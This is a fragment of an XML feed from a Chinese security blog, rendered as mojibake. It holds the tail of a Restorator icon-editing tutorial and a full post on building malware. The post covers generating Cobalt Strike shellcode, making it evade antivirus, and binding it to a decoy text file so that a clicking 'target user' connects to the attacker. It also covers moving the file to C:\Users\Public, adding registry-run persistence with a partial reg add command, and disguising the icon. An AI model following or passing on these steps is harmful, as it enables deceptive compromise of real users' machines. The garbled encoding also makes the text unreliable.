"></p><p>5ã€256<em>128</em>96<em>64</em>48<em>32</em>24<em>16-RGB/Aã€256</em>128<em>96</em>64<em>48</em>32<em>24</em>16-256è‰²ã€256<em>128</em>96<em>64</em>48<em>32</em>24*16-16è‰²ä»¥ä¸Šæ˜¯å›¾æ ‡é¡¹-5000å›¾åƒä¿¡æ¯ï¼Œæ›¿æ¢æ–°çš„ICONè¿›æ¥æ—¶è¯·ç¡®ä¿å›¾æ ‡ä¿¡æ¯è¦å’ŒåŸæ¥çš„æ ¼å¼/æ•°é‡ä¸€è‡´ï¼</p><p>6ã€ä¸ºäº†è¾¾åˆ°å®‰å…¨ç¨³å®šçš„ä½¿ç”¨æ•ˆæœï¼Œè¯·é€ä¸ªæ£€æŸ¥ä½ å°†è¦é€‰æ‹©æ›¿æ¢çš„ICONé¡¹çš„æ ¼å¼å’Œæ•°é‡ï¼Œç¡®ä¿æ›¿æ¢ä¸€è‡´ã€‚</p><p>7ã€è¯·å°†ä½ è¦æ›¿æ¢çš„icoå…¨éƒ¨æ”¾åˆ°åŒä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œé¢ï¼Œå¹¶å¯¹åº”å›¾æ ‡åœ¨åº”ç”¨æ–‡ä»¶é‡Œé¢çš„ç¼–å·ï¼ˆçº¢1ï¼‰ï¼Œæ¯”å¦‚ï¼š5000å¯¹åº”çš„æ˜¯å®‰å…¨ï¼Œ5004å¯¹åº”çš„æ˜¯é˜²ç«å¢™â€¦â€¦ï¼ˆçº¢2ï¼‰è¿™é‡Œæ˜¯æ–‡ä»¶æ¸¸è§ˆå™¨ï¼Œæ–¹ä¾¿æˆ‘ä»¬æŸ¥çœ‹è¦æ›¿æ¢ç”¨çš„ICONã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132746168905326653562.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬28å¼ "></p><p>8ã€å°†ä½ è¦æ›¿æ¢çš„å›¾æ ‡æ•´ç†åˆ°åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åç”¨æ–‡ä»¶æ¸¸è§ˆå™¨æ‰¾åˆ°å¹¶è¿›å…¥ï¼ˆçº¢2ï¼‰ï¼Œç›´åˆ°çœ‹åˆ°æ‰€æœ‰å·²ç»ç¼–å·å¥½çš„å›¾æ ‡ï¼ˆçº¢1ï¼‰ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132748168905326864697.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬29å¼ "></p><p>9ã€å¦‚æœä½ çš„å‡†å¤‡å·¥ä½œåšå¥½äº†ï¼Œæˆ‘ä»¬å°±è¦å¼€å§‹æ‰¹é‡æ›¿æ¢å›¾æ ‡äº†ã€‚</p><p>10ã€å³é”®å·¦è¾¹èµ„æºæ ‘çš„å›¾æ ‡é¡¹ï¼ˆæ–‡ä»¶å¤¹å›¾æ ‡ï¼‰ï¼Œé€‰æ‹©å¯¼å…¥(O)ï¼Œç‚¹å‡»è‡ªåŠ¨å¯¼å…¥æ‰€æœ‰&quot;å›¾æ ‡&quot;ç±»å‹(Z)</p><p>11ã€å¯¼å…¥å®Œåï¼Œç›´æ¥æŒ‰F12å¦å­˜ä¸ºï¼Œä¿å­˜å®Œæˆäº†ï¼</p>]]></content>
    
    
    <summary type="html">ğŸ¥§Restoratorå¸¸è§ä½¿ç”¨æ–¹æ³•</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å·¥å…·ä½¿ç”¨" scheme="https://m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>å…æ€æœ¨é©¬+æ–‡ä»¶æ†ç»‘+æƒé™ä¼ªè£…</title>
    <link href="https://m3x1.cn/posts/1bec3970.html"/>
    <id>https://m3x1.cn/posts/1bec3970.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:27:47.018Z</updated>
    
    <content type="html"><![CDATA[<h1>å…æ€æœ¨é©¬+æ–‡ä»¶æ†ç»‘+æƒé™ä¼ªè£…</h1><ul><li><p><strong>æ–‡ç« å‰è¨€</strong></p><p>é€šè¿‡å­¦ä¹ ä½¿ç”¨Cobalt Strikeæ¥åˆ¶ä½œæœ¨é©¬ï¼Œä½¿ç”¨æ‘§æ—¥å¯¹å…¶è¿›è¡Œå…æ€è¦†ç›–ï¼Œä½¿ç”¨GoFilebinderå¯¹å…¶è¿›è¡Œå…æ€æ†ç»‘ï¼Œæœ€ååˆ©ç”¨Restoratorå¯¹å…¶è¿›è¡Œå›¾æ ‡ä¿®æ”¹ã€‚</p></li><li><p><strong>ç¯å¢ƒå’Œè½¯ä»¶å‡†å¤‡</strong></p><p>\1. ä¸€å°windowsç³»ç»Ÿçš„ç”µè„‘ä½œä¸ºæ”»å‡»æœº</p><p>2.ä¸€å°é¶æœº</p><p>3.Cobalt Strike</p><p>4.æ‘§æ—¥</p><p>5.GoFilebinder</p><p>6.Restorator</p></li><li><p><strong>å·¥å…·ä»‹ç»</strong></p><p>æ‘§æ—¥ï¼šä¸€æ¬¾çº¢é˜Ÿä¸“ç”¨å…æ€æœ¨é©¬ç”Ÿæˆå™¨ï¼ŒåŸºäºshellcodeç”Ÿæˆç»•è¿‡æ‰€æœ‰æ€è½¯çš„æœ¨é©¬ä¸»è¦æ”¯æŒCè¯­è¨€çš„shellcodeå’Œçº¯åå…­è¿›åˆ¶çš„shellcode<br>GoFileBinderï¼šgolangå…æ€æ†ç»‘å™¨<br>Restoratorï¼šä¸€æ¬¾ä¿®æ”¹exeæ‰§è¡Œç¨‹åºå›¾æ ‡çš„å°å·¥å…·</p></li><li><p><strong>æ­£æ–‡å¼€å§‹</strong></p><p>é€‰ç”¨csä¸­çš„cæ ¼å¼shellcodeï¼Œç”¨csç”Ÿæˆä¸€ä¸ªcè¯­è¨€çš„ç›¸å…³ä¸œè¥¿ï¼ŒåŒæ—¶å‹¾é€‰ä¸Šx64</p></li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGTurmQDUUoIkwBgIUztkiayF20PQOFDEGIDPwCsExIlZMoXWZtqhbHUQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPsqAbCOyCY0LR1zGsKphmjGtM7UdiarEu9KtVXqAiaJqUXDe5fkibo8HQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"></p><p>å®Œæˆä»¥ä¸Šæ­¥éª¤åï¼Œæ¥ä¸‹æ¥ä¾¿å¼€å§‹å¯¹å…¶è¿›è¡Œå…æ€æ“ä½œï¼Œç”¨åˆ°çš„å·¥å…·æ‘§æ—¥å¯¹å…¶è¿›è¡Œå…æ€å¤„ç†</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGWGKt2ibzRFhNE3XWAQ4SNIDDgcx9iasydQDQ76s0lDdwIoL6lz3QSJnQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"></p><p>ä½¿ç”¨å‰è¯·å…ˆè·å–ç›¸å…³å·¥å…·ï¼Œå¹¶ç¡®ä¿å·²ç»å®‰è£…å·¥å…·æ‰€éœ€è¦çš„çš„goç¯å¢ƒï¼Œè‡³äºgoç¯å¢ƒå®‰è£…è¯·å„ä½è‡ªè¡ŒæŸ¥é˜…æœ¬æ–‡ä¸åœ¨åšå‡ºç›¸å…³ä»‹ç»ï¼Œå®‰è£…å®Œæ¯•åè¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚å¤åˆ¶ä¸Šä¸€æ­¥ä¸­ç”Ÿæˆçš„cæ–‡ä»¶çš„ä¸­çš„ç›¸å…³å­—ç¬¦ï¼Œå°†å…¶å¦å­˜ä¸ºä¸€ä¸ªæ–°çš„æ–‡æ¡£ï¼Œå¹¶å°†è¯¥æ–‡æ¡£ä¸æ‘§æ—¥å·¥å…·çš„exeæ–‡ä»¶æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¹‹ä¸­ï¼Œå¹¶è¿è¡Œå·¥å…·ï¼Œè¿è¡ŒæˆåŠŸåå°†ä¼šå¾—åˆ°å…æ€åçš„æ–‡ä»¶hoshino.exeã€‚ç”¨ç›¸å…³ç®¡å®¶è¿›è¡ŒæŸ¥æ€åï¼Œéƒ½å¯ä»¥æ­£å¸¸é€šè¿‡ã€‚</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGe2AiaWzWQRTVAaDMS4PdZJB2OwscrU2Od3UElHEbaB4alWSVxILs1ww/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGLFv5IbhM97F127XqH2teAoYrFOK0Aia24fdlAPrVrl1fdd364prbZ6w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"></p><p>ç„¶åè¿›è¡Œçš„æ“ä½œæ˜¯å°†è¿™ä¸ªé©¬å’Œæ­£å¸¸çš„ä¸œè¥¿æ†ç»‘åœ¨ä¸€èµ·ï¼Œè¿™ä¸ªä¸œè¥¿å¯ä»¥æ˜¯å¯æ‰§è¡Œæ–‡ä»¶exeï¼Œä¹Ÿå¯ä»¥æ˜¯æ–‡æœ¬txtï¼Œä¹Ÿå¯ä»¥æ˜¯æ–‡æ¡£docï¼Œä»»ä½•ä½ æƒ³çš„ä¸œè¥¿éƒ½å¯ä»¥è¿›è¡Œæ†ç»‘ã€‚<br>æœ€åå®ç°çš„æ•ˆæœæ˜¯ï¼šç›®æ ‡ç”¨æˆ·ç‚¹å‡»ä½ å‘é€çš„æ¶æ„æ–‡ä»¶ä¹‹åä¼šåœ¨ä½ çš„CSå®¢æˆ·ç«¯ä¸Šä¸Šçº¿ï¼Œè€Œä¸”ç›®æ ‡ç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶å¯ä»¥æ­£å¸¸çš„ä½¿ç”¨ï¼Œå¹¶ä¸”ä½ çš„æœ¨é©¬æ–‡ä»¶ä¼šè‡ªåŠ¨è¿ç§»åˆ°C:\Users\Public<br>ä¸‹é¢å°†æœ¨é©¬å’Œä¸€ä¸ªtxtæ–‡æœ¬æ–‡ä»¶è¿›è¡Œæ†ç»‘ï¼š</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGR4x3GXibUMMPPmiaD0gDe0FXbg4KGzwKb8rMEI8y18Iga8ic9YcyqORXg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"></p><p>å°†æœ¨é©¬å’Œtxtæ–‡æœ¬æ–‡ä»¶è¿˜æœ‰GoFileBinderæ”¾åœ¨åŒçº§ç›®å½•ä¸‹ï¼Œè¿è¡Œåå¾—åˆ°å¦‚ä¸‹ç»“æœï¼Œå…¶ä¸­æ–°å‡ºç°çš„bilibili.exeå°±æ˜¯æˆ‘ä»¬è¦å¾—åˆ°çš„æ–‡ä»¶</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGGRG2ibtmIjhvOkPhxzToHfPmVSH88PDGicKjLERicaxtQcsphHztxHg6g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"></p><p>è¿›è¡Œç›¸å…³æµ‹è¯•ï¼Œå°†å¾—åˆ°çš„æ–‡ä»¶åŒå‡»åï¼Œè¯¥æ–‡ä»¶ä¾¿ä¼šæ¶ˆå¤±ï¼Œåœ¨æ¡Œé¢ä¸Šæ‰“å¼€çš„ä¾¿æ˜¯æˆ‘ä»¬æ‰€é¢„è®¾çš„ceshi.txtï¼Œå¹¶ä¸”æˆ‘ä»¬çš„åŸæ–‡é—´å°†ä¼šè‡ªåŠ¨ä¸€ç›´åˆ°publicç›®å½•ä¸‹ï¼Œcsä¹Ÿæ˜¾ç¤ºä¸»æœºå·²ç»ä¸Šçº¿ï¼Œè‡³æ­¤æ‰€æœ‰å·¥ä½œå·²å…¨éƒ¨å®Œæˆã€‚</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcG1F5yKYmDyIqj4H7s2ibdN7w5tPWFIm6hDrVsjlCyDSeWYx28IWgcI1w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/640" alt="å›¾ç‰‡"></p><p>æœ€åä¸€æ­¥ï¼Œæƒé™ç»´æŒï¼Œå¦‚æœä¸è¿›è¡Œæƒé™ç»´æŒçš„è¯ï¼Œç›®æ ‡ç”¨æˆ·åœ¨è¿›è¡Œç”µè„‘é‡å¯åä¾¿ä¼šè®©æ”¹æ–‡ä»¶å…³é—­ï¼Œå› æ­¤ä¾¿éœ€è¦ç”¨å¯¹å…¶å¢åŠ å¼€æœºè‡ªå¯çš„ç›¸å…³æ“ä½œï¼Œå…¶åç»­è·¯å¾„å› ä¸ºç¨‹åºä¼šè‡ªåŠ¨ç§»åŠ¨åˆ°publicç›®å½•ä¸‹ä¾¿å¾ˆå¥½å°±èƒ½è®¾ç½®ï¼Œ</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add HKLM\SOFTWARE\Microsoft\Windows\</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPjicPN7J7OvoS4UJvyzEkic3qlqUYl4Nby6ImRM2YopEtia00jpm7Zv3w/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="å›¾ç‰‡"></p><p>æœ€ååˆ©ç”¨Restoratorå·¥å…·å¯¹è¯¥æ–‡ä»¶è¿›è¡Œå›¾æ ‡ç¾åŒ–æ“ä½œï¼Œå¯ä»¥å°†å…¶ä¼ªè£…æˆä¸€äº›è¾ƒä¸ºå¸¸è§çš„è¿›ç¨‹å›¾æ ‡ï¼Œè¯¥å·¥å…·çš„ä½¿ç”¨è¾ƒä¸ºæ–¹ä¾¿ï¼Œæœ¬æ–‡åœ¨è¿™é‡Œä¾¿ä¸å†è¿›è¡Œç›¸å…³çš„é˜è¿°ï¼Œè¯·è‡ªè¡Œç†è§£ï¼</p>]]></content>
    
    
    <summary type="html">ğŸ¥§å…æ€æœ¨é©¬+æ–‡ä»¶æ†ç»‘+æƒé™ä¼ªè£…</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
